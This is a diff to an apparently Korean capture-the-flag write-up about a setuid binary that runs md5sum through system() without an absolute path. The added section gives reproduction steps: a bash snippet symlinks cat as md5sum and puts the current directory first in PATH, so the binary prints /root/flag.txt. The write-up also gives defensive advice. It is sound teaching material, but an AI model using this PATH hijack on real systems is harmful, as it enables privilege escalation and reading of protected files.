@@ -55,6 +55,18 @@ Computing the MD5 hash of /root/flag.txt....
 
 `system()`은 셸을 통해 명령을 실행합니다. 이때 명령 안에 들어 있는 실행 파일명이 절대경로가 아니라면, 셸은 `PATH`를 따라 해당 프로그램을 찾습니다. setuid 바이너리라도 **환경과 셸 검색 경로를 잘못 신뢰하면** 이런 식의 우회가 가능합니다.
 
+## 재현 절차
+1. 바이너리가 `md5sum`을 절대경로 없이 호출하는지 확인합니다.
+2. `md5sum` 이름의 래퍼를 준비하고 PATH를 앞에 둡니다.
+3. 실행 결과가 해시가 아니라 flag로 바뀌는지 검증합니다.
+
+```bash
+# 현재 디렉터리에 가짜 md5sum을 두고 PATH를 우선시합니다.
+ln -s /usr/bin/cat md5sum
+export PATH=".:$PATH"
+./flaghasher
+```
+
 ## 6. 방어 관점 메모
 
 - `system()` 대신 `execve()`를 쓰고, 실행 파일은 **절대경로**를 사용해야 합니다.
